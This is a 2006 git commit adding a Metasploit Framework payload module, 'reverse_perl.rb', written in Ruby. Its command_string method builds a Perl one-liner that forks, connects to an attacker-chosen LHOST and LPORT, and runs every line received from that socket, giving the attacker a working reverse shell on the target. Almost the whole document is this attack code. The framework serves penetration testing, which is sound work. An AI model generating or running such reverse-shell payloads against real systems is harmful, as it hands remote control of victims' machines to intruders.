7cedfcc828c4c96e9ef1fdcfb30f1057f4ad80f0
bmc <>
2006-01-23 17:14:33 +0000

    * connectback perl payload
    git-svn-id: file:///home/svn/incoming/trunk@3435 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/unix/reverse_perl.rb
@@ -0,0 +1,51 @@
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Msf
+module Payloads
+module Singles
+module Cmd
+module Unix
+
+module ReversePerl
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'          => 'Unix Command, Double reverse TCP connection (via perl)',
+			'Version'       => '$Revision$',
+			'Description'   => 'Creates an interactive shell via perl',
+			'Author'        => 'cazz',
+			'License'       => MSF_LICENSE,
+			'Platform'      => 'unix',
+			'Arch'          => ARCH_CMD,
+			'Handler'       => Msf::Handler::ReverseTcp,
+			'Session'       => Msf::Sessions::CommandShell,
+			'PayloadType'   => 'cmd',
+			'Payload'       =>
+				{
+					'Offsets' => { },
+					'Payload' => ''
+				}
+			))
+	end
+
+	#
+	# Constructs the payload
+	#
+	def generate
+		return super + command_string
+	end
+	
+	#
+	# Returns the command string to use for execution
+	#
+	def command_string
+		cmd = "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"#{datastore['LHOST']}:#{datastore['LPORT']}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+	end
+
+end
+
+end end end end end
